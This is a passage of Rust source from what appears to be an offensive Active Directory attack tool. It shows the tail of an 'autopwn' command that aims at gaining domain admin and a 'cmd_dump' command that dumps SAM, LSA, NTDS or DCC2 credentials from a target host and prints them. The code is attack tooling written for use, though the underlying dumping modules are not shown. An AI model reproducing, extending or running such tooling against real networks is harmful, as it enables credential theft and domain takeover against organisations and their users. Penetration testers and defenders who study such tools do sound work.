    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    let config = autopwn::AutoPwnConfig {
        dchost: dc,
        creds,
        target: target.to_string(),
        stealth,
        dryrun: dry_run,
        exec_method: method,
    };

    let result = autopwn::run(config).await;
    if result.domain_admin_achieved { 0 } else { 1 }
}

// ═══════════════════════════════════════════════════════
// cmd_dump
// ═══════════════════════════════════════════════════════

async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    banner::print_module_banner("DUMP");
    println!(
        "  {} Target: {}  Source: {:?}",
        "▸".bright_black(),
        target.cyan(),
        source
    );
    let ctx = match creds.to_exec_context(&dc, false, false) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };
    let mut state = EngagementState::new();
    let action = match source {
        DumpSource::Sam => PlannedAction::DumpSam {
            target: target.to_string(),
        },
        DumpSource::Lsa => PlannedAction::DumpLsa {
            target: target.to_string(),
        },
        DumpSource::Ntds => PlannedAction::DumpNtds {
            target: target.to_string(),
        },
        DumpSource::Dcc2 => PlannedAction::DumpDcc2 {
            target: target.to_string(),
        },
    };
    let step = PlanStep {
        id: "cli_dump_001".to_string(),
        description: format!("Dump {:?} from {}", source, target),
        stage: Stage::Loot,
        action,
        priority: 50,
        noise: NoiseLevel::High,
        depends_on: vec![],
        executed: false,
        result: None,
        retries: 0,
        max_retries: 1,
    };
    let result = overthrone_pilot::executor::execute_step(&step, &ctx, &mut state).await;
    if result.success {
        banner::print_success(&format!(
            "Dump complete: {} credentials extracted",
            result.new_credentials
        ));
        if !result.output.is_empty() {
            println!("\n{}", result.output);
        }
        0
    } else {
        banner::print_fail(&result.output);
        1
    }
}
